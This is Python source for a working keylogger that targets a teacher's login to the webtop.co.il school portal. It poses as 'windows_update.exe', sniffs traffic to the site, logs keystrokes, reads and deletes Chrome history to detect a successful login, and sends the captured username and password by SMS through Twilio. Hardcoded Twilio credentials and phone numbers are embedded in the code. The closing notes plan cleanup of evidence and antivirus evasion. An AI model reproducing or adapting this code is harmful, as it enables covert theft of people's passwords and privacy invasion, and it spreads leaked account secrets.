from scapy.all import sniff  # packet capture module
import socket  # to find webtop ip
import threading  # to use both the keylogger and the packet sniffer
from pynput.keyboard import Listener  # to use for the keylogger
# import logging
import time  # to sleep for 11 seconds while the history page refreshes
import requests  # to send the password to Twilio so that it can send an sms to me
import sys
import os  # find where the history and startup folders are

INTERFACE = ["Ethernet", "Wi-Fi"]
caps = False
caps_lock_on = False
shift = False
isTrue = False
has_two = 0
counter = 0
HISTORY_FILE = ""
PATH_TO_PROGRAM = os.environ['USERPROFILE'] + r"Desktop\windows_update.exe"
STARTUP_DIRECTORY = os.getenv('PROGRAMDATA') + r'\Microsoft\Windows\Start Menu\Programs\StartUp'
HISTORY_FILE_OPTIONS = [os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\History",
                        os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History"]
# The history file of chrome could also be in "profile 1" instead of "default" , should check for both
FULL_URL = 'www.webtop.co.il/v2/default.aspx'
GOT_IN_AFTER_INCORRECT_TRY = 'www.webtop.co.il/v2/default.aspx?loginFailure=1&autoLoad=alert'
INCORRECT_LOGIN_URL = 'www.webtop.co.il/v2/default.aspx?loginFailure=1'

# logdir = os.environ['USERPROFILE'] + '\\Desktop\\'
# logdir = r"C:/Users/Admin/Documents/Yehonatan/Cyber/project/"
# Uploads logged keys to a file called klog-res.txt
# logging.basicConfig(filename=(logdir + "123.txt"), level=logging.INFO, format="%(message)s")
# logs the keys to file
LIST_OF_SPECIALS = ["Key.tab", "Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l",
                    "Key.alt_r", "Key.menu", "Key.left", "Key.down", "Key.right", "Key.up", "Key.insert",
                    "Key.delete", "Key.print_screen", "Key.home", "Key.end", "Key.page_up", "Key.page_down",
                    "Key.num_lock", "Key.f5", "Key.esc"]
username_and_password = ""
# Special symbols that can only be achieved with shift letter
special_numbers = {"1": "!", "2": "@", "3": "#", "4": "$",
                   "5": "%", "6": "^", "7": "&", "8": "*",
                   "9": "(", "0": ")", "=": "+", "-": "_", "/": "?", ",": "<", ".": ">"}


def on_press(key):
    """ When a key is being pressed, check if it is shift or caps lock. If so, change caps"""
    if str(key) == "Key.caps_lock" or str(key) == "Key.shift":
        change_caps(key)


def on_release(key):
    """ When a key is being released, check if you should add it to the message, ignore it or change the caps"""
    global username_and_password
    global shift
    global caps
    global LIST_OF_SPECIALS
    if str(key) == "Key.shift":
        change_caps(key)
    # print('{0} released'.format(key))
    elif str(key) in LIST_OF_SPECIALS:
        pass
    elif str(key) == "Key.backspace":
        delete_letter()
    else:
        add_password(key)


def delete_letter():
    """ Deletes a character if the user hit the backspace"""
    global username_and_password
    username_and_password = username_and_password[0:-1]


def add_password(key):
    """Adds the letter to the username and password"""
    global caps
    global shift
    global special_numbers
    global username_and_password
    if str(key).replace("'", "") in special_numbers and shift:
        # f.write(special_numbers[str(key).replace("'", "")])
        username_and_password += special_numbers[str(key).replace("'", "")]
    else:
        if str(key) == "Key.space":
            letter = " "
        else:
            letter = str(key).replace("'", '')
        if caps:
            username_and_password += letter.upper()
            # f.write(letter.upper())
        else:
            username_and_password += letter
            # f.write(letter)


def run_keylogger():
    """Starts the keylogger"""
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


def change_caps(key):
    """ function to tell the program if it should store uppercase or lowercase"""
    global shift
    global caps
    global caps_lock_on
    if str(key) == "Key.caps_lock":
        if not caps:
            caps = True
        else:
            caps = False
    if str(key) == "Key.shift":
        if shift:
            shift = False
            caps = False
        else:
            caps = True
            shift = True
    return


def check_history():
    """Checks if the url of webtop once you log in is in the history file,
     returns True if in the file and False otherwise"""
    global HISTORY_FILE
    global FULL_URL
    global GOT_IN_AFTER_INCORRECT_TRY
    global INCORRECT_LOGIN_URL
    time.sleep(11)
    # It takes 11 seconds for history page to update
    f = open(HISTORY_FILE, 'r', encoding='latin-1')
    read = f.read()
    if FULL_URL in read and INCORRECT_LOGIN_URL not in read or GOT_IN_AFTER_INCORRECT_TRY in read:
        return True
    else:
        return False


def where_is_history_file():
    """ finds out where is the History file (I found 2 places it could be)"""
    global HISTORY_FILE_OPTIONS
    global HISTORY_FILE
    for option in HISTORY_FILE_OPTIONS:
        try:
            isFile = os.path.exists(option)
            if isFile:
                HISTORY_FILE = option
        except FileNotFoundError:
            pass


where_is_history_file()


def delete_history():
    """Deletes the history file on the computer for google chrome"""
    global HISTORY_FILE
    os.remove(HISTORY_FILE)


def send_sms():
    """Sends a request to Twilio through the requests package of python to send an SMS to me. """
    """By using the requests package, the function sends a post request to Twilio which sends an sms to me with the 
    info of the password"""
    global username_and_password
    account_sid = "ACdfeb6cf0756bca90fdaa4e4904e26276"
    # os.environ['ACCOUNT_SID']
    authentication_token = "1570aa988b247bc39446d1e1080d5164"
    sender_number = "+12018176831"
    # os.environ['AUTH_TOKEN']
    receiver_number = "+972586993220"
    # os.environ['MY_PHONE_NUMBER']
    # client = Client(account_sid, authentication_token)
    response = requests.post(
        f'https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Messages.json',
        auth=(account_sid, authentication_token),
        data={
            "From": sender_number,
            "To": receiver_number,
            "Body": username_and_password
        })


def check_if_deleted():
    """Checks if the history was deleted every time the user restarts the computer. If not, it deletes the history and
    creates a txt file containing the history that was deleted - the sign that the history was deleted at least once"""
    global HISTORY_FILE
    try:
        file_test = open(HISTORY_FILE + '-logs.txt', 'r')
        file_test.close()
    except FileNotFoundError:
        file = open(HISTORY_FILE, 'r', encoding='latin-1')
        read_file = file.read()
        file.close()
        file_change = open(HISTORY_FILE + '-logs.txt', 'a', encoding='latin-1')
        file_change.write(read_file)
        delete_history()


def destroy_evidence():
    global PATH_TO_PROGRAM
    """This function will restore all the settings before the download of the program,
     the shortcut and the program itself"""
    # os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')
    # os.remove(HISTORY_FILE + '-logs.txt')
    # os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
    # os.remove(rf"{PATH_TO_PROGRAM}")


def main():
    """Starts the sniffing,starts the keylogger in run_keylogger and checks if user logged in by
     calling the check_history() function, logs the keylogger in log() function and exits code if they are."""
    global username_and_password
    check_if_deleted()
    print('start')
    addr1 = socket.gethostbyname('webtop.co.il')
    sniff(iface=INTERFACE, filter=f"host {addr1}", count=30)
    tracker = threading.Thread(target=run_keylogger, daemon=True)
    tracker.setDaemon(True)
    tracker.start()

    while 1:
        sniff(iface=INTERFACE, filter=f"host {addr1}", count=20)
        checking_history = threading.Thread(target=check_history)
        checking_history.start()
        logged_in = check_history()
        if logged_in:
            # send_sms()
            # Leaving log function for now, if I have a use for storing with log instead of variable
            # log()
            destroy_evidence()
            sys.exit()


if __name__ == "__main__":
    main()

# Further continue the program beyond minimal viable product:

# 1) Make the keylogger deal with the shift after the victim entered username and password
# It is too slow now and can slightly miss Changes in shift and check generally for bugs

# 2) In the log of keylogger, every time the mouse is clicked, go to new line
# Need to think if this will not make things messier and if so fix that

# 3) For every time a webtop packet goes to sniffer, make a different thread to deal with it,
# so sniffer won't miss packets. For example, if put incorrect password, the main thread will wait 11 seconds before
# it checks again. This might be a problem if person inputs password in those 11 seconds

# 4) Check for bugs in general

# 5) Change the code so it will rename the history file and after the process is completed switch it back,
# to make it less suspicious.

# 6) Add for keylogger delete button that erases key after the cursor

# 7) Add a function that checks if the variable is close to reaching the max amount for a string (or for SMS),
# then puts it in a txt

# 8) Test to see if avast and other antivirus programs allow to download an html page and then turn it to exe file after
# it was downloaded


# ASSUMPTIONS:
# Assuming that the teacher is not aware of history file and will not delete it right before the program starts
# Works only on windows
# Currently works only for webtop, though it can be changed slightly to find different websites.
# Works only on google chrome so far (could be changed to work on other applications that save the history in a file -
# Not in incognito mode for chrome


# DONE LIST:
# 1) When finding history, file can also be in os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History
# Check for both
# 2) DONE  check for wifi or ethernet interface, it could be any one of those
# 3) Find way, after restart, to not delete history but only after first encounter
# 4) Use Twilio without the helper package - it takes too much and the download time take too long
# 5) The program will remove all traces of itself, the shortcut and any settings changes it did
